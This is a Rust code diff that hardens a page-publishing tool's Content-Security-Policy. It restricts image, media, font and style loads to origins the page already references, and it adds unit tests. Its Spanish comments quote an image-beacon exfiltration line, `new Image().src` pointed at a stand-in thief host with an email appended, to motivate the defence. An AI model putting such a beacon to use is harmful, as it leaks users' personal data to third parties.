@@ -22,8 +22,11 @@
 // Deliberate scope notes:
 //   - frame-ancestors can't ship via <meta> (spec-ignored) — Caddy's
 //     X-Frame-Options covers it until per-release headers exist.
-//   - style-src stays unset: inline <style> + style attributes are load-
-//     bearing on every page; the lockdown value here is script execution.
+//   - style-src DOES ship now, with 'unsafe-inline': los <style> y los
+//     atributos style sostienen todas las paginas, asi que no se prohibe el
+//     estilo en linea — se acota de que ORIGENES puede venir un @import.
+//     Junto con img/media/font, es lo que cierra la fuga por la puerta de
+//     al lado que connect-src no ve.
 //   - No SRI on the Tailwind CDN fallback: cdn.tailwindcss.com serves an
 //     evergreen (unpinned) build, so a pinned hash would break the page on
 //     their next deploy. The bake that removes the CDN is the real fix.
@@ -87,7 +90,8 @@ pub fn seal_release(html: &str, form_action_extra: Option<&str>) -> SealResult {
         errors.push(format!("script src without a parseable origin: {src}"));
     } else {
         let has_3d = html.contains("data-ol-has-3d-block");
-        let policy = build_policy(&script_hashes, &external_scripts, form_action_extra, has_3d);
+        let assets = collect_asset_origins(&doc);
+        let policy = build_policy(&script_hashes, &external_scripts, form_action_extra, has_3d, &assets);
         inject_csp_meta(&doc, &policy);
         sealed = true;
     }
@@ -240,11 +244,140 @@ fn script_origin(src: &str) -> Option<String> {
     Some(format!("{}{}", scheme, host.to_ascii_lowercase()))
 }
 
+/// Orígenes ajenos que el documento YA referencia, repartidos por directiva.
+#[derive(Default)]
+struct AssetOrigins {
+    img: Vec<String>,
+    media: Vec<String>,
+    font: Vec<String>,
+    style: Vec<String>,
+}
+
+fn push_origin(dst: &mut Vec<String>, raw: &str) {
+    if let Some(o) = script_origin(raw.trim()) {
+        if !dst.contains(&o) {
+            dst.push(o);
+        }
+    }
+}
+
+/// Cada URL absoluta de un `srcset` ("a.jpg 1x, b.jpg 2x").
+fn push_srcset(dst: &mut Vec<String>, raw: &str) {
+    for parte in raw.split(',') {
+        if let Some(u) = parte.split_whitespace().next() {
+            push_origin(dst, u);
+        }
+    }
+}
+
+/// Las URLs dentro de `url(...)` de una hoja o un atributo `style`.
+fn push_css_urls(dst: &mut Vec<String>, css: &str) {
+    let bytes = css.as_bytes();
+    let mut i = 0;
+    while let Some(rel) = css[i..].find("url(") {
+        let abre = i + rel + 4;
+        let Some(largo) = css[abre..].find(')') else { break };
+        let cruda = css[abre..abre + largo].trim().trim_matches([0x22 as char, 0x27 as char]);
+        push_origin(dst, cruda);
+        i = abre + largo;
+        if i >= bytes.len() {
+            break;
+        }
+    }
+}
+
+/// LO QUE EL DOCUMENTO YA PIDE, y nada más.
+///
+/// La lista NO se escribe a mano: se saca de la propia página. Toda imagen,
+/// vídeo, fuente u hoja que esté en el documento tiene su origen permitido, así
+/// que ninguna página existente se rompe. Lo que queda fuera es un origen
+/// NUEVO, inventado en tiempo de ejecución — que es exactamente la forma de una
+/// fuga: `new Image().src = "https://ladron/?" + correo`.
+///
+/// Importa porque esta política no tiene `default-src`: sin estas directivas,
+/// img/media/font/style no estaban restringidos EN ABSOLUTO, y `connect-src`
+/// por sí solo deja la puerta de las imágenes abierta de par en par.
+fn collect_asset_origins(doc: &NodeRef) -> AssetOrigins {
+    let mut o = AssetOrigins::default();
+    if let Ok(nodos) = doc.select("img, source, video, audio, link, style, [style]") {
+        for n in nodos {
+            let nodo = n.as_node().clone();
+            let NodeData::Element(d) = nodo.data() else { continue };
+            let nombre = d.name.local.to_ascii_lowercase();
+            let attrs = d.attributes.borrow();
+
+            if let Some(v) = attrs.get("style") {
+                push_css_urls(&mut o.img, v);
+            }
+            match &*nombre {
+                "img" => {
+                    if let Some(v) = attrs.get("src") { push_origin(&mut o.img, v); }
+                    if let Some(v) = attrs.get("srcset") { push_srcset(&mut o.img, v); }
+                }
+                "source" => {
+                    // Un <source> vive en <picture> (imagen) o en <video>/<audio>
+                    // (media). Sin recorrer el padre no se sabe, así que su origen
+                    // entra en los dos: permitir de más un origen QUE YA ESTÁ en la
+                    // página no abre nada; dejarlo fuera rompe la página.
+                    if let Some(v) = attrs.get("src") { push_origin(&mut o.img, v); push_origin(&mut o.media, v); }
+                    if let Some(v) = attrs.get("srcset") { push_srcset(&mut o.img, v); push_srcset(&mut o.media, v); }
+                }
+                "video" | "audio" => {
+                    if let Some(v) = attrs.get("src") { push_origin(&mut o.media, v); }
+                    if let Some(v) = attrs.get("poster") { push_origin(&mut o.img, v); }
+                }
+                "link" => {
+                    let rel = attrs.get("rel").unwrap_or("").to_ascii_lowercase();
+                    let Some(href) = attrs.get("href") else { continue };
+                    if rel.contains("stylesheet") { push_origin(&mut o.style, href); }
+                    if rel.contains("preconnect") || rel.contains("dns-prefetch") {
+                        // Google Fonts sirve la hoja desde fonts.googleapis.com y
+                        // los ficheros desde fonts.gstatic.com, que sólo aparece en
+                        // el preconnect. Sin esto, la tipografía se cae.
+                        push_origin(&mut o.font, href);
+                        push_origin(&mut o.style, href);
+                    }
+                    if rel.contains("icon") { push_origin(&mut o.img, href); }
+                    if rel.contains("preload") {
+                        match attrs.get("as").unwrap_or("") {
+                            "font" => push_origin(&mut o.font, href),
+                            "image" => push_origin(&mut o.img, href),
+                            "video" | "audio" => push_origin(&mut o.media, href),
+                            "style" => push_origin(&mut o.style, href),
+                            _ => {}
+                        }
+                    }
+                }
+                _ => {}
+            }
+        }
+    }
+    // Las @font-face y los background-image de las hojas en línea.
+    if let Ok(estilos) = doc.select("style") {
+        for st in estilos {
+            let texto = st.as_node().text_contents();
+            push_css_urls(&mut o.img, &texto);
+            push_css_urls(&mut o.font, &texto);
+        }
+    }
+    o
+}
+
+/// Une `'self'` + los esquemas seguros + lo que el documento ya referencia.
+fn fuente(base: &str, origenes: &[String]) -> String {
+    if origenes.is_empty() {
+        base.to_string()
+    } else {
+        format!("{} {}", base, origenes.join(" "))
+    }
+}
+
 fn build_policy(
     hashes: &[String],
     externals: &[String],
     form_action_extra: Option<&str>,
     has_3d: bool,
+    assets: &AssetOrigins,
 ) -> String {
     // Pages with a 3D block load a same-origin runtime chunk dynamically (on tap),
     // so 'self' must be allowed in script-src for that page only.
@@ -285,12 +418,35 @@ fn build_policy(
     // service worker — comprobado en lib/publish, lib/three3d y este crate. Un
     // worker es el sitio natural donde esconder trabajo de red o de CPU, así
     // que se cierra antes de que exista la primera página que pueda abrirlo.
+    // img/media/font/style: cerradas a lo que el documento YA pide.
+    //
+    // `connect-src` sola no basta. Sin estas, un script podía sacar datos por la
+    // puerta de al lado —`new Image().src = "https://ladron/?" + correo`— y esa
+    // vía no la ve ninguna de las directivas que ya había. Aquí está la
+    // diferencia entre "no puede hacer peticiones" y "no puede filtrar".
+    //
+    // La lista de orígenes NO se escribe a mano: sale del propio documento, así
+    // que toda imagen, vídeo o fuente que ya esté en la página sigue cargando.
+    // Lo que queda fuera es un origen NUEVO, inventado en tiempo de ejecución —
+    // que es exactamente la forma de una fuga.
+    //
+    // `data:` y `blob:` se permiten porque no salen a ninguna parte: son bytes
+    // que ya viajan dentro de la página.
+    //
+    // `style-src` lleva 'unsafe-inline' porque los `<style>` y los atributos
+    // `style` sostienen TODAS las páginas, y el CDN de Tailwind inyecta estilo
+    // en tiempo de ejecución. Su valor aquí no es prohibir estilo en línea: es
+    // acotar de qué ORÍGENES puede venir un `@import`.
+    let img_src = fuente("'self' data: blob:", &assets.img);
+    let media_src = fuente("'self' data: blob:", &assets.media);
+    let font_src = fuente("'self' data:", &assets.font);
+    let style_src = fuente("'self' 'unsafe-inline'", &assets.style);
     format!(
         "script-src {}; connect-src {}; worker-src 'none'; object-src 'none'; \
-         base-uri 'none'; \
+         base-uri 'none'; img-src {}; media-src {}; font-src {}; style-src {}; \
          frame-src https://www.youtube-nocookie.com https://player.vimeo.com; \
          form-action {}",
-        script_src, connect_src, form_action
+        script_src, connect_src, img_src, media_src, font_src, style_src, form_action
     )
 }
 
@@ -468,6 +624,63 @@ mod tests {
     fn worker_src_is_closed() {
         let r = seal_release("<html><head></head><body></body></html>", None);
         assert!(r.html.contains("worker-src 'none'"));
+    }
+
+    /// LA PUERTA DE AL LADO. `connect-src` no la ve: `new Image().src` no es una
+    /// petición de red a efectos de esa directiva, y sin `default-src` no había
+    /// NADA restringiendo las imágenes. Es la vía de fuga más barata que existe.
+    #[test]
+    fn img_src_is_closed_to_unknown_origins() {
+        let r = seal_release("<html><head></head><body><p>x</p></body></html>", None);
+        assert!(r.sealed);
+        assert!(r.html.contains("img-src 'self' data: blob:;"));
+        assert!(r.html.contains("media-src 'self' data: blob:"));
+        assert!(r.html.contains("font-src 'self' data:"));
+    }
+
+    /// Y NO ROMPE LAS PÁGINAS QUE YA EXISTEN: la lista no se escribe a mano, se
+    /// saca del documento. Todo lo que la página ya pide sigue cargando.
+    #[test]
+    fn origins_already_in_the_document_stay_allowed() {
+        let html = r#"<html><head>
+            <link rel="preconnect" href="https://fonts.gstatic.com">
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">
+            <style>.h{background-image:url("https://images.openlen.com/a.webp")}</style>
+            </head><body>
+            <img src="https://images.openlen.com/b.webp">
+            <video src="https://cdn.ejemplo.test/v.mp4" poster="https://otro.test/p.jpg"></video>
+            </body></html>"#;
+        let r = seal_release(html, None);
+        assert!(r.sealed);
+        let csp = r.html.clone();
+        // La imagen, el fondo por CSS y el póster del vídeo.
+        assert!(csp.contains("https://images.openlen.com"));
+        assert!(csp.contains("https://otro.test"));
+        // El vídeo, en media-src.
+        assert!(csp.contains("https://cdn.ejemplo.test"));
+        // Google Fonts entero: la hoja y los ficheros, que sólo aparecen en el
+        // preconnect. Sin esto la tipografía de media plataforma se cae.
+        assert!(csp.contains("https://fonts.googleapis.com"));
+        assert!(csp.contains("https://fonts.gstatic.com"));
+    }
+
+    /// Un origen que NO está en el documento no entra. Ésa es toda la defensa:
+    /// el script sólo puede pedir a donde la página ya pedía.
+    #[test]
+    fn an_origin_not_in_the_document_is_not_allowed() {
+        let html = r#"<html><head></head><body><img src="https://images.openlen.com/a.webp"></body></html>"#;
+        let r = seal_release(html, None);
+        assert!(r.html.contains("https://images.openlen.com"));
+        assert!(!r.html.contains("ladron.test"));
+    }
+
+    /// `style-src` acota el ORIGEN de un `@import`, no prohíbe el estilo en
+    /// línea: los `<style>` y los atributos `style` sostienen todas las páginas,
+    /// y el CDN de Tailwind inyecta estilo en tiempo de ejecución.
+    #[test]
+    fn style_src_keeps_inline_working() {
+        let r = seal_release("<html><head><style>p{color:red}</style></head><body></body></html>", None);
+        assert!(r.html.contains("style-src 'self' 'unsafe-inline'"));
     }
 
     #[test]
